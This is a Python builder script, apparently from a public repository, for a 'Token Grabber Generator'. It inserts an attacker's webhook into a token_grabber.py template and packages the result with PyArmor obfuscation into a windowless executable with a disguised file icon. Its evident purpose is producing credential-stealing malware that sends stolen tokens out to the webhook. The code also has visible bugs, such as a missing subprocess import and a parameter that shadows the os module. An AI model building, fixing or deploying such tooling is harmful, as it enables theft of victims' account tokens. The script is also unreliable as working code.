from sys import platform
import argparse

class Builder:

    def __init__(self, webhook, out_file, os):
        self.path_to_pyarmor = os.path.expanduser('~/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyarmor.exe')
        self.webhook = webhook
        self.out_file = out_file
        self.os = os

    def build(self):        
        f = open("code/token_grabber.py", 'r')
        file = f.read()
        f.close()
        newfile = file.replace("{WEBHOOK}", str(self.webhook))
        f = open(self.out_file+".py", 'w')
        f.write(newfile)
        f.close()

        if self.os == "Linux":
            self.packageLinux()
        elif self.os == "Windows":
            self.packageWindows()
        elif self.os == "OSX":
            self.packageOSX()
        else:
            print("\nOS not supported\n")

    def packageLinux(self):
        compile_command = ["wine", self.path_to_pyarmor, '--clean -e " --onefile --noconsole --icon=img/exe_file.ico"', self.out_file+".py"]
        subprocess.call(compile_command)

    def packageWindows(self):
        compile_command = ["venv/Scripts/pyarmor.exe", '--clean -e " --onefile --noconsole --icon=img/exe_file.ico"', self.out_file+".py"]
        subprocess.call(compile_command)

    def packageOSX(self):
        #Add manual obfuscation and pyinstaller command
        pass

def getArgs():
    parser = argparse.ArgumentParser(description='Token Grabber Generator')
    parser.add_argument('-w', '--webhook', help='Add your webhook', action='store_true')
    parser.add_argument('-o', '--outfile', help='Name your Executable', action='store_true')    
    return parser.parse_args()

def checkOS():
    if platform == "linux" or platform == "linux2":
        OS = "Linux"
    elif platform == "darwin":
        OS = "OSX"
    elif platform == "win32":
        OS = "Windows"
    else:
        OS = "Unknown"
    return OS

arguments = getArgs()
if not arguments.webhook or not arguments.outfile:
    print("\n[-] Please Make Sure You Have Provided A Webhook And An Output File Name")

webhook = arguments.webhook
out_file = arguments.outfile
OS = checkOS()

print('''
████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
   ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
   ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
   ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝                                                                                                         

Made By Dimitris Kalopisis & Yuliy Mitryashkin | Twitter: @DKalopisis & @JM1k1
''')

try:
    print("\n[+] Generating Token Grabber, please wait...")
    Builder(webhook, out_file, OS).build()
    print("\n[+] Succesfully Generated Token Grabber\nYou can find it inside the dist directory")
except Exception as e:
    print(f"\n[-] An ERROR has occurred:\n{e}")